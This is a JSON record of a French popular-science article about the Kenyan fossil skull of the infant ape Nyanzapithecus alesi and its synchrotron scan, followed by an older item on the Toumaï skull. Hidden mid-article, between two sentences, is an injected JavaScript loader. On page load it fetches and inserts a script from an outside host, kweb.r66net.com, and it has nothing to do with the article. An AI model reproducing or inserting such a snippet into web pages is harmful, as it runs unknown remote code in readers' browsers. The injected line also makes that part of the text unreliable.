{"title": "Ce precieux crane eclaire l'histoire des grands singes, donc la notre", "newspaper": "Futura Sciences", "author": ["Jean-Luc Goudet"], "date_publi": "2017-08-10", "content": "Extraordinairement bien conserve, le crane d'un bebe singe vieux de 13 millions d'annees et decouvert au Kenya a pu etre explore aux rayons X. Il eclaire un pan obscur de l'histoire des ancetres des primates. Ce qu'il faut retenir Nyanzapithecus alesi  devait etre proche du dernier ancetre commun des Hommes et des singes. Il a ete trouve pres du lac Turkana, au nord du Kenya, ou ont deja ete decouverts des fossiles d'hominides, bien plus recents, donc. Alors que les paleontologues ne disposaient que de quelques dents et de rares fragments de machoire, voila un crane avec ses dents et ses oreilles internes. Du jamais vu. Celui-ci vient combler un trou dans notre connaissance de l'histoire des primates. C'est une superbe decouverte qu'a realisee l'equipe menee par  Isaiah Nengo , de la  Stony Brook University  et du  Turkana Basin Institute  : un  crane  complet, gros comme un citron, d'un  singe , date de 13 millions d'annees et exhume au nord du Kenya, a Napudet, a l'ouest de l'immense lac Turkana. Ce  fossile  a l'apparence modeste est unique au monde car il est le seul crane connu d'un  ancetre des singes  actuels et des humains. Jusque-la, les paleontologues n'avaient, pour explorer l'histoire des ancetres de nos ancetres, que des dents et des fragments de machoire.  << Nous n'avions aucun crane de singe entre -17 et -7 millions d'annees >>,  souligne dans un  communique de la   Wake Forest University  Ellen Keller, coauteur de l'article paru dans  Nature . Le crane du bebe singe  Nyanzapithecus alesi  entre les doigts de l'un de ses decouvreurs. (c) Fondation Leakey                               L'histoire des singes eclairee par les rayons X Ce fossile du  Miocene  moyen vient donc eclairer une zone meconnue de l'histoire de nos  ancetres communs avec les singes , la separation d'avec les  chimpanzes  s'etant deroulee en Afrique entre -7 et -6 millions d'annees (voir l'article ci-dessous rapportant la decouverte initiale du desormais celebre Toumai). Mais que s'est-il passe avant ? Les singes sont-ils apparus en Afrique ou en Asie ?  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Voir aussi : Ganlea, l'ancetre des singes, etait asiatique Le petit crane, repere en 2014 par un chasseur de fossiles, John Ekusi, pourra apporter des elements de reponses. Il s'est montre en effet tres bavard. Degage de sa gangue de  gres , il a ete scrute avec l'un des plus puissants << scanners >> du monde : le  synchrotron de l'ESRF  ( European Synchrotron Radiation Facility ), produisant un rayonnement X extremement puissant. Les chercheurs ont pu ainsi decouvrir l'interieur et, en particulier, l' oreille interne , extraordinairement bien conservee. La representation en 3D du crane du petit singe de 13 millions d'annees realisee a l'aide du synchrotron de l'ESRF, a Grenoble. Les details des dents de lait non encore sorties et de l'oreille interne sont remarquables. (c)  Leakey Institute , YouTube L'origine de la lignee des Hommes et des singes serait africaine L'animal etait un bebe. Grace aux dents -- de lait et encore dans la machoire --, l'age a pu etre fixe entre 4 mois et 1 an. Le  materiau  volcanique contenu dans la  boite cranienne  a permis une datation. Initialement, le museau de faible taille a mis les scientifiques sur la piste d'un bebe  gibbon . Mais l'oreille interne, intimement revelee a l'ESRF, a montre, par sa structure plus simple, qu'elle n'a rien a voir avec celle du gibbon, adapte a virevolter de branche en branche. Devenu adulte, le petit singe du Miocene n'aurait pu se permettre de telles acrobaties. Le saviez-vous ? L'ESRF ( European Synchrotron Radiation Facility ) est un accelerateur de particules, plus precisement d'electrons, situe a Grenoble. Son anneau principal, dit << de stockage >>, mesure 844 m de circonference et les particules y voyagent presqu'a la vitesse de la lumiere. Parce qu'ils tournent, donc changent sans cesse de direction, ces electrons emettent un rayonnement. Ceux de l'ESRF ont des longueurs d'onde comprises entre 0,01 et 0,1 nanometre : ce sont des rayons X << durs >>. Installe a Grenoble, l'ESRF est un instrument europeen realise par 22 pays. Il est a la disposition des scientifiques de toutes disciplines et du monde entier, qui l'utilisent pour sonder la matiere. Les clients sont des paleontologues, des archeologues, des historiens de l'art, des specialistes de la science des materiaux, des chimistes, des biologistes, des ingenieurs specialistes de nanotechnologies, etc. Ce nourrisson a pu etre rapproche, grace a ses dents, du genre  Nyanzapithecus , deja connu au Kenya. Mais l' espece  etait nouvelle et les chercheurs l'ont baptisee  alesi , forge avec  ales  signifiant << ancetre >> en langue turkana. L'echantillon KNM-NP 59050 est ainsi devenu  Nyanzapithecus   alesi . L'histoire est racontee sur le site de la  fondation Leakey , qui a soutenu l'expedition et dont fait partie Isaiah Nengo.  Jane Goodall  et  Dian Fossey  en sont sans doute les membres les plus celebres. Le fils des fondateurs (Mary et Louis), Richard Leakey, paleoanthropologue, a d'ailleurs procede lui-meme a des fouilles sur les rives de ce lac. Selon Isaiah Nengo, cet Alesi demontre que le groupe auquel il appartenait, il y a plus de dix millions d'annees, est apparente a la lignee qui a conduit aux singes actuels et aux Hommes. L'origine de celle-ci est donc africaine, conclut-il. Pour en savoir plus Un crane de plus de 6 millions d'annees Communique du CIRS publie le 14 juillet 2002 Des restes fossiles semblant avoir appartenu a un membre tres primitif de la famille humaine ont ete decouverts en Afrique centrale, dans le  desert  de Djurab (Tchad). Ces restes sont constitues d'un crane, de dents et de morceaux d'os de machoire datant de plus de 6 millions d'annees. Cette decouverte serait de premiere importance, tant en raison de son anciennete que du lieu de la decouverte. Les scientifiques decrivent Toumai, surnom donne par les autorites tchadiennes a la decouverte et signifiant << espoir de vie >>, comme ayant des caracteristiques aussi bien de singes que d'humains. Le  volume  cranien est ainsi proche de celui du chimpanze et la face, petite, ainsi que les dents, ressemblent a celles d'un prehumain. Le lieu de la decouverte, l'Afrique centrale, est aussi inattendu. En effet, jusqu'a maintenant les scientifiques pensaient que le berceau de l'humanite se situait en Afrique de l'Est. Sahelanthropus tchadensis  avait ete decouvert le 19 juillet 2001. Il vient de faire l'objet d'une description par  Michel Brunet  (universite de Poitiers, CNRS), qui a dirige les fouilles, et ses collegues, dans la revue  Nature  11 juillet 2002. Selon les scientifiques, il s'agit de la decouverte la plus importante dans la recherche des origines du genre humain depuis la mise au jour des restes d' Australopithecus  africanus  en 1925. Plusieurs questions sont soulevees par cette decouverte. Selon Brunet, elle indique que la separation entre chimpanzes et humains a du se produire plus tot que presume. Selon lui, Toumai serait un prehumain. Cependant d'autres paleontologues le classent plutot parmi les grands singes primitifs, et d'autres encore considerent qu'il s'agit d'un ancetre commun aux  hominides  et aux singes se situant avant leur separation. Pour  Yves Coppens , professeur au College de France, le statut exact de ce nouveau primate n'est pas encore determine avec certitude. Selon lui, meme s'il s'agit d'un grand singe, cela n'en serait que plus interessant car, dans la genealogie des singes, les chercheurs sont sans indication pour une periode se comptant en millions d'annees. ", "theme": "planete"}